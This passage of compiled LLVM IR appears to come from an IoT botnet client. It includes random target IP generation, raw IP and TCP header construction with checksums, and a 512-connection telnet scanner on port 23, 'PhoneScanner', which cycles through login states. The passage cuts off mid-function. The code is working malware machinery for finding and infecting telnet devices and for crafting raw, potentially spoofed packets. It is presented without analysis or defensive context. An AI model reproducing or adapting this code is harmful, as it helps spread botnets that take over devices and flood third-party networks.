  %670 = zext i8 %669 to i32
  %671 = load i8, i8* @ipState.3, align 1
  %672 = zext i8 %671 to i32
  %673 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %668, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.285, i64 0, i64 0), i32 %670, i32 %672)
  br label %.thread163

.thread255:                                       ; preds = %0
  %674 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %675 = load i8, i8* @ipState.2, align 1
  %676 = zext i8 %675 to i32
  %677 = load i8, i8* @ipState.3, align 1
  %678 = zext i8 %677 to i32
  %679 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %674, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.286, i64 0, i64 0), i32 %676, i32 %678)
  br label %.thread163

.thread257:                                       ; preds = %0
  %680 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %681 = load i8, i8* @ipState.2, align 1
  %682 = zext i8 %681 to i32
  %683 = load i8, i8* @ipState.3, align 1
  %684 = zext i8 %683 to i32
  %685 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %680, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i64 0, i64 0), i32 %682, i32 %684)
  br label %.thread163

; <label>:686:                                    ; preds = %0
  %687 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %688 = load i8, i8* @ipState.2, align 1
  %689 = zext i8 %688 to i32
  %690 = load i8, i8* @ipState.3, align 1
  %691 = zext i8 %690 to i32
  %692 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %687, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.288, i64 0, i64 0), i32 %689, i32 %691)
  br label %.thread163

; <label>:693:                                    ; preds = %0
  %694 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %695 = load i8, i8* @ipState.2, align 1
  %696 = zext i8 %695 to i32
  %697 = load i8, i8* @ipState.3, align 1
  %698 = zext i8 %697 to i32
  %699 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %694, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.289, i64 0, i64 0), i32 %696, i32 %698)
  br label %.thread163

; <label>:700:                                    ; preds = %0
  %701 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %702 = load i8, i8* @ipState.2, align 1
  %703 = zext i8 %702 to i32
  %704 = load i8, i8* @ipState.3, align 1
  %705 = zext i8 %704 to i32
  %706 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %701, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.290, i64 0, i64 0), i32 %703, i32 %705)
  br label %.thread163

.thread266:                                       ; preds = %0
  %707 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %708 = load i8, i8* @ipState.2, align 1
  %709 = zext i8 %708 to i32
  %710 = load i8, i8* @ipState.3, align 1
  %711 = zext i8 %710 to i32
  %712 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %707, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.291, i64 0, i64 0), i32 %709, i32 %711)
  br label %.thread163

.thread267:                                       ; preds = %0
  %713 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %714 = load i8, i8* @ipState.2, align 1
  %715 = zext i8 %714 to i32
  %716 = load i8, i8* @ipState.3, align 1
  %717 = zext i8 %716 to i32
  %718 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %713, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.292, i64 0, i64 0), i32 %715, i32 %717)
  br label %.thread163

.thread271:                                       ; preds = %0
  %719 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %720 = load i8, i8* @ipState.2, align 1
  %721 = zext i8 %720 to i32
  %722 = load i8, i8* @ipState.3, align 1
  %723 = zext i8 %722 to i32
  %724 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %719, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.293, i64 0, i64 0), i32 %721, i32 %723)
  br label %.thread163

.thread273:                                       ; preds = %0
  %725 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %726 = load i8, i8* @ipState.2, align 1
  %727 = zext i8 %726 to i32
  %728 = load i8, i8* @ipState.3, align 1
  %729 = zext i8 %728 to i32
  %730 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %725, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.294, i64 0, i64 0), i32 %727, i32 %729)
  br label %.thread163

; <label>:731:                                    ; preds = %0
  %732 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %733 = load i8, i8* @ipState.2, align 1
  %734 = zext i8 %733 to i32
  %735 = load i8, i8* @ipState.3, align 1
  %736 = zext i8 %735 to i32
  %737 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %732, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i64 0, i64 0), i32 %734, i32 %736)
  br label %.thread163

; <label>:738:                                    ; preds = %0
  %739 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %740 = load i8, i8* @ipState.2, align 1
  %741 = zext i8 %740 to i32
  %742 = load i8, i8* @ipState.3, align 1
  %743 = zext i8 %742 to i32
  %744 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %739, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.296, i64 0, i64 0), i32 %741, i32 %743)
  br label %.thread163

; <label>:745:                                    ; preds = %0
  %746 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %747 = load i8, i8* @ipState.2, align 1
  %748 = zext i8 %747 to i32
  %749 = load i8, i8* @ipState.3, align 1
  %750 = zext i8 %749 to i32
  %751 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %746, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.297, i64 0, i64 0), i32 %748, i32 %750)
  br label %.thread163

.thread281:                                       ; preds = %0
  %752 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %753 = load i8, i8* @ipState.2, align 1
  %754 = zext i8 %753 to i32
  %755 = load i8, i8* @ipState.3, align 1
  %756 = zext i8 %755 to i32
  %757 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %752, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.298, i64 0, i64 0), i32 %754, i32 %756)
  br label %.thread163

.thread282:                                       ; preds = %0
  %758 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %759 = load i8, i8* @ipState.2, align 1
  %760 = zext i8 %759 to i32
  %761 = load i8, i8* @ipState.3, align 1
  %762 = zext i8 %761 to i32
  %763 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %758, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.299, i64 0, i64 0), i32 %760, i32 %762)
  br label %.thread163

; <label>:764:                                    ; preds = %0
  %765 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %766 = load i8, i8* @ipState.2, align 1
  %767 = zext i8 %766 to i32
  %768 = load i8, i8* @ipState.3, align 1
  %769 = zext i8 %768 to i32
  %770 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %765, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.300, i64 0, i64 0), i32 %767, i32 %769)
  br label %.thread163

; <label>:771:                                    ; preds = %0
  %772 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %773 = load i8, i8* @ipState.2, align 1
  %774 = zext i8 %773 to i32
  %775 = load i8, i8* @ipState.3, align 1
  %776 = zext i8 %775 to i32
  %777 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %772, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.301, i64 0, i64 0), i32 %774, i32 %776)
  br label %.thread163

.thread163:                                       ; preds = %..thread163_crit_edge, %.thread139, %447, %.thread179, %.thread178, %509, %.thread161, %495, %342, %335, %258, %384, %.thread158, %488, %328, %321, %265, %377, %.thread157, %481, %314, %307, %272, %370, %467, %.thread151, %745, %.thread273, %738, %.thread271, %363, %279, %286, %293, %300, %731, %.thread155, %516, %223, %.thread180, %440, %.thread136, %700, %.thread257, %693, %.thread255, %686, %.thread253, %412, %237, %637, %.thread236, %630, %.thread235, %405, %244, %617, %.thread230, %391, %349, %610, %.thread224, %603, %.thread221, %454, %230, %.thread142, %590, %.thread213, %433, %.thread134, %.thread135, %583, %.thread209, %426, %.thread132, %.thread133, %419, %.thread128, %.thread129, %564, %.thread200, %557, %.thread199, %550, %.thread197, %.thread198, %543, %.thread196, %398, %251, %356, %530, %.thread182, %523, %.thread181, %502, %.thread177, %474, %.thread154, %764, %.thread282, %.thread281, %.thread267, %.thread266, %.thread249, %.thread248, %.thread247, %.thread246, %.thread239, %.thread225, %.thread214, %.thread210, %.thread193, %.thread164, %.thread156, %216, %771
  %.pre-phi = phi i8* [ %.pre, %..thread163_crit_edge ], [ %168, %.thread139 ], [ %448, %447 ], [ %102, %.thread179 ], [ %108, %.thread178 ], [ %510, %509 ], [ %126, %.thread161 ], [ %496, %495 ], [ %343, %342 ], [ %336, %335 ], [ %259, %258 ], [ %385, %384 ], [ %132, %.thread158 ], [ %489, %488 ], [ %329, %328 ], [ %322, %321 ], [ %266, %265 ], [ %378, %377 ], [ %138, %.thread157 ], [ %482, %481 ], [ %315, %314 ], [ %308, %307 ], [ %273, %272 ], [ %371, %370 ], [ %468, %467 ], [ %156, %.thread151 ], [ %746, %745 ], [ %725, %.thread273 ], [ %739, %738 ], [ %719, %.thread271 ], [ %364, %363 ], [ %280, %279 ], [ %287, %286 ], [ %294, %293 ], [ %301, %300 ], [ %732, %731 ], [ %461, %.thread155 ], [ %517, %516 ], [ %224, %223 ], [ %96, %.thread180 ], [ %441, %440 ], [ %174, %.thread136 ], [ %701, %700 ], [ %680, %.thread257 ], [ %694, %693 ], [ %674, %.thread255 ], [ %687, %686 ], [ %668, %.thread253 ], [ %413, %412 ], [ %238, %237 ], [ %638, %637 ], [ %12, %.thread236 ], [ %631, %630 ], [ %18, %.thread235 ], [ %406, %405 ], [ %245, %244 ], [ %618, %617 ], [ %24, %.thread230 ], [ %392, %391 ], [ %350, %349 ], [ %611, %610 ], [ %30, %.thread224 ], [ %604, %603 ], [ %36, %.thread221 ], [ %455, %454 ], [ %231, %230 ], [ %162, %.thread142 ], [ %591, %590 ], [ %42, %.thread213 ], [ %434, %433 ], [ %186, %.thread134 ], [ %180, %.thread135 ], [ %584, %583 ], [ %48, %.thread209 ], [ %427, %426 ], [ %198, %.thread132 ], [ %192, %.thread133 ], [ %420, %419 ], [ %210, %.thread128 ], [ %204, %.thread129 ], [ %565, %564 ], [ %54, %.thread200 ], [ %558, %557 ], [ %60, %.thread199 ], [ %551, %550 ], [ %72, %.thread197 ], [ %66, %.thread198 ], [ %544, %543 ], [ %78, %.thread196 ], [ %399, %398 ], [ %252, %251 ], [ %357, %356 ], [ %531, %530 ], [ %84, %.thread182 ], [ %524, %523 ], [ %90, %.thread181 ], [ %503, %502 ], [ %114, %.thread177 ], [ %475, %474 ], [ %150, %.thread154 ], [ %765, %764 ], [ %758, %.thread282 ], [ %752, %.thread281 ], [ %713, %.thread267 ], [ %707, %.thread266 ], [ %662, %.thread249 ], [ %656, %.thread248 ], [ %650, %.thread247 ], [ %644, %.thread246 ], [ %624, %.thread239 ], [ %597, %.thread225 ], [ %577, %.thread214 ], [ %571, %.thread210 ], [ %537, %.thread193 ], [ %120, %.thread164 ], [ %144, %.thread156 ], [ %217, %216 ], [ %772, %771 ]
  %778 = call i32 @inet_addr(i8* nonnull %.pre-phi) #5
  ret i32 %778
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !17

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !18

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %8 = tail call noalias i8* @malloc(i64 44) #5
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #5
  ret i16 %14
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #5
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @PhoneScanner() local_unnamed_addr #12 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %3 to %struct.timeval*
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %7 = tail call i32 @rand_cmwc()
  %8 = xor i32 %7, %6
  tail call void @srand(i32 %8) #5
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %10, i16* %11, align 2
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %13 = bitcast i8* %12 to i64*
  store i64 0, i64* %13, align 4
  %14 = tail call noalias i8* @malloc(i64 513) #5
  tail call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 513, i32 1, i1 false)
  %15 = alloca [512 x %struct.telstate_t], align 16
  %16 = bitcast [512 x %struct.telstate_t]* %15 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2560, i32 16, i1 false)
  br label %21

.preheader:                                       ; preds = %21
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %18 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 0
  %20 = bitcast i32* %1 to i8*
  br label %.loopexit

; <label>:21:                                     ; preds = %21, %0
  %indvars.iv110 = phi i64 [ 0, %0 ], [ %indvars.iv.next111.1, %21 ]
  %22 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv110
  %23 = bitcast %struct.telstate_t* %22 to i8*
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 32, i32 16, i1 false)
  %24 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv110, i32 3
  store i8 1, i8* %24, align 1
  %25 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv110, i32 9
  store i8* %14, i8** %25, align 8
  %indvars.iv.next111 = or i64 %indvars.iv110, 1
  %26 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv.next111
  %27 = bitcast %struct.telstate_t* %26 to i8*
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 32, i32 16, i1 false)
  %28 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv.next111, i32 3
  store i8 1, i8* %28, align 1
  %29 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv.next111, i32 9
  store i8* %14, i8** %29, align 8
  %indvars.iv.next111.1 = add nsw i64 %indvars.iv110, 2
  %exitcond112.1 = icmp eq i64 %indvars.iv.next111.1, 512
  br i1 %exitcond112.1, label %.preheader, label %21

.loopexit.loopexit:                               ; preds = %243
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  br label %30

; <label>:30:                                     ; preds = %243, %.loopexit
  %indvars.iv = phi i64 [ 0, %.loopexit ], [ %indvars.iv.next, %243 ]
  %31 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv
  %32 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 7
  %33 = load i32, i32* %32, align 16
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %37

; <label>:35:                                     ; preds = %30
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %36, i32* %32, align 16
  br label %37

; <label>:37:                                     ; preds = %35, %30
  %38 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 2
  %39 = load i8, i8* %38, align 8
  switch i8 %39, label %243 [
    i8 0, label %40
    i8 1, label %71
    i8 2, label %114
    i8 3, label %132
    i8 4, label %140
    i8 5, label %158
    i8 6, label %166
    i8 7, label %190
    i8 8, label %198
    i8 9, label %216
    i8 10, label %224
  ]

; <label>:40:                                     ; preds = %37
  %41 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  %42 = load i8, i8* %41, align 1
  %43 = icmp eq i8 %42, 1
  br i1 %43, label %44, label %._crit_edge

._crit_edge:                                      ; preds = %40
  %.phi.trans.insert = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 1
  %.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %51

; <label>:44:                                     ; preds = %40
  %45 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %46 = bitcast i8** %45 to i64*
  %47 = load i64, i64* %46, align 8
  %48 = bitcast %struct.telstate_t* %31 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 32, i32 16, i1 false)
  store i64 %47, i64* %46, align 8
  %49 = call i32 @PhoneScan()
  %50 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 1
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %._crit_edge, %44
  %52 = phi i32 [ %.pre, %._crit_edge ], [ %49, %44 ]
  store i16 2, i16* %9, align 4
  store i16 %10, i16* %11, align 2
  store i64 0, i64* %13, align 4
  store i32 %52, i32* %17, align 4
  %53 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  store i32 %53, i32* %54, align 16
  %55 = icmp eq i32 %53, -1
  br i1 %55, label %243, label %56

; <label>:56:                                     ; preds = %51
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %53, i32 3, i8* null) #5
  %58 = or i32 %57, 2048
  %59 = call i32 (i32, i32, ...) @fcntl(i32 %53, i32 4, i32 %58) #5
  %60 = load i32, i32* %54, align 16
  %61 = call i32 @connect(i32 %60, %struct.sockaddr* nonnull %18, i32 16) #5
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %70

; <label>:63:                                     ; preds = %56
  %64 = tail call i32* @__errno_location() #18
  %65 = load i32, i32* %64, align 4
  %66 = icmp eq i32 %65, 115
  br i1 %66, label %70, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* %54, align 16
  %69 = call i32 @sclose(i32 %68)
  store i8 1, i8* %41, align 1
  br label %243

; <label>:70:                                     ; preds = %63, %56
  store i8 1, i8* %38, align 8
  store i32 0, i32* %32, align 16
  br label %243

; <label>:71:                                     ; preds = %37
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %19) #5, !srcloc !20
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
